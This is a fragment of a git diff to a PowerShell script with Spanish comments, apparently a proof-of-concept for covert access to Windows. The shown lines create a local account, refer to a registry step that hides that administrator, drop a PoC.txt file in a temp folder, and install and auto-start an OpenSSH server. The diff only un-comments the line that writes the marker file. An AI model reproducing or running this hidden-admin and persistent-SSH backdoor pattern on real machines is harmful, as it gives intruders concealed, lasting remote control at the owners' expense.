@@ -38,7 +38,7 @@ create_account -uname $uname -pword $pword
 #ir al directorio en la carpeta %temp%, crear un archivo PoC.txt
 mkdir $path
 cd $path
-#echo "" > poc.txt
+echo "" > poc.txt
 
 #registro para esconder administrador
 $reg_file = random_text 
@@ -57,7 +57,6 @@ Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd 
 Set-Service -Name sshd -StartupType 'Automatic'
 Get-NetFirewallRule -Name *ssh*
-
 
 
 
